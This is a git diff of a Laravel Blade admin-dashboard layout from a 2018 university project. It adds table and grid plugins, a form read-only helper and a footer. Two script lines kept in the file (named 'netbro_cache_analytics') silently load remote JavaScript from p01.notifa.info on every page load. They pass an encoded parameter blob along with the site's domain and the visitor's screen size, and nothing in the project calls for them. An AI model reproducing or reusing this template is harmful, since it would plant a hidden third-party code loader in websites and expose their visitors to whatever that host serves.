@@ -15,6 +15,8 @@
     <link href="{{ asset('asset/bootstrap/dist/css/bootstrap.min.css') }}" rel="stylesheet">
     <!-- Menu CSS -->
     <link href="{{ asset('asset/plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css') }}" rel="stylesheet">
+    <!-- Table CSS -->
+    <link href="{{ asset('asset/css/dataTables.bootstrap.min.css') }}" rel="stylesheet">
     <!-- toast CSS -->
     <link href="{{ asset('asset/plugins/bower_components/toast-master/css/jquery.toast.css') }}" rel="stylesheet">
     <!-- morris CSS -->
@@ -31,13 +33,25 @@
     <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
     <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
 <![endif]-->
+    <script type="text/javascript">
+    function matikanForm(formId, yesNo) {
+    var f = document.getElementById(formId), s, opacity;
+    for(var i=0; i<f.length; i++) f[i].readOnly = yesNo;
+    }
+    window.onload=function(){matikanForm('myForm',true);}; // disabled by default
+    </script>
 </head>
 <body>
     <!-- Preloader -->
-    <div class="preloader">
+    <!-- <div class="preloader">
         <div class="cssload-speeding-wheel"></div>
-    </div>
+    </div> -->
     @yield('content')
+                <!-- /.container-fluid -->
+                <footer class="footer text-center"> 2018 &copy; Informatika Universitas Jenderal Achmad Yani </footer>
+        </div>
+        <!-- /#page-wrapper -->
+    </div>
 <!-- /#wrapper -->
 </body>
     <!-- jQuery -->
@@ -59,12 +73,22 @@
     <!-- Custom Theme JavaScript -->
     <script src="{{ asset('asset/js/custom.min.js') }}"></script>
     <script src="{{ asset('asset/js/dashboard1.js') }}"></script>
+    <!-- Editable -->
+    <script src="{{ asset('asset/plugins/bower_components/jsgrid/db.js') }}"></script>
+    <script type="text/javascript" src="{{ asset('asset/plugins/bower_components/jsgrid/dist/jsgrid.min.js') }}"></script>
+    <script src="{{ asset('asset/js/jsgrid-init.js') }}"></script>
+    <script src="{{ asset('asset/js/dataTables.bootstrap.min.js') }}"></script>
+    <script src="{{ asset('asset/js/jquery.dataTables.min.js') }}"></script>
     <!-- Sparkline chart JavaScript -->
     <script src="{{ asset('asset/plugins/bower_components/jquery-sparkline/jquery.sparkline.min.js') }}"></script>
     <script src="{{ asset('asset/plugins/bower_components/jquery-sparkline/jquery.charts-sparkline.js') }}"></script>
-    <script src="{{ asset('asset/plugins/bower_components/toast-master/js/jquery.toast.js') }}"></script>
-    <script src="{{ asset('asset/plugins/bower_components/styleswitcher/jQuery.style.switcher.js') }}"></script>
     <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYVcyCLFVCu9IUBITM5nfRfI621FVInN7YZ%2fcIQzWOfwlOsEc5pW4KHBQUc9Ui0LVAsZMAQJda%2bvRN9PGYw2JYqj51GJ%2bKUMYCl8Xtp9rhEmMs8sOjA7xbwcJEqyuC4OSmX4Em4Jr%2bUgbJQMiCjYwjWUPu5Kwlh8KTl1%2bmw1h1oB0HtoYc5TkLDWkosjZ3NAxAgkHy0QY8rHoEr%2flCq7wxJj7En6TKCEuYwXvC1ONLwwq11xAOKKQiiZ4%2fqiEKzLKwIhH6M32p1RqMouPstSUKG1oCdBQ2ZNl7UqGm8UUmU4xKexNVNXCPArMgfxWTARfwqu8HCEO0aLLdSamO5gVHDZvneBdcI%2fWouZAC876Ku2Qros%2fQOO5PNaFPBrNcbJS83UNYSpkRB76XZAn2NfsdMyThA%2bwBdTzlM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+        <script type="text/javascript">
+            $(document).ready(function() {
+                $('#example').DataTable();
+            } );
+        </script>
 
     <!-- <script type="text/javascript">
     $(document).ready(function() {
@@ -82,7 +106,4 @@
     <!--Style Switcher -->
     <script src="{{ asset('asset/plugins/bower_components/styleswitcher/jQuery.style.switcher.js') }}"></script>
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYXjPxCe3OlvXB9Iu75bcgaU6HiJuW1xmMV5ty%2fa9xCiWe%2fJqTvN%2fIBSi4PCe3KUjfsXQjEXvK%2bjcDUYQ4u4efaU%2fpej2pImSoUgT5vDxCiNEBOZuolPBpPiMPuDvoKVEVb7OoOesmqkl3rBqyo8IC5N9XEPy5J680krrJKw6s9Nss31zUNgai2QMOxexbnkXuXh6SHV7or4YmoI3Mh%2fd2zRlKkLw0IBxOEF0J8BPmWgjBqVfF%2btpzQii0lHCiAvVoHjU%2bNp5y3FyZqL%2b0W9C1eR8y4pcQNs7wuZiA3TsrFGareE21kv3Wydb8I%2fZqrqgFdoztI02Izbe4e3hiXO1cchVCNtc7UumK9cRDsl3IhkWWqT07dtmAm5ZTK%2f4%2b6fPQYk7tBRvYY4W8ZJyoKx%2fz1y0zJYGgOdef8%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
-
-
-<!-- Mirrored from wrappixel.com/demos/admin-templates/pixeladmin/main/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 Jul 2018 07:06:48 GMT -->
 </html>
